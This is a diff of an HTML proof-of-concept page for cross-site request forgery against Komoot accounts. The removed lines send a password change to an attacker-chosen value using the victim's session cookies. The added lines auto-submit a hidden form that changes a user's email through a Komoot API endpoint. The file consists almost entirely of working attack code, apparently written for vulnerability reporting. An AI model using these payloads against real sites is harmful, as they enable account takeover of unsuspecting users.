@@ -1,18 +1,12 @@
+<!DOCTYPE html>
 <html>
   <body>
-    <h1>CSRF PoC - Komoot Password Change</h1>
+    <form action="https://www.komoot.com/api/v007/users/4813680692742?hl=en" method="POST" enctype="application/json">
+      <input type="hidden" name="email" value="test123@gmail.com">
+    </form>
     <script>
-      fetch("https://account.komoot.com/v1/password_change", {
-        method: "POST",
-        credentials: "include", // Include victim's session cookies
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          password: "root1234", // Attacker-defined new password
-          sign_out_primary_sessions: false
-        })
-      });
+      document.forms[0].submit();
     </script>
   </body>
 </html>
+
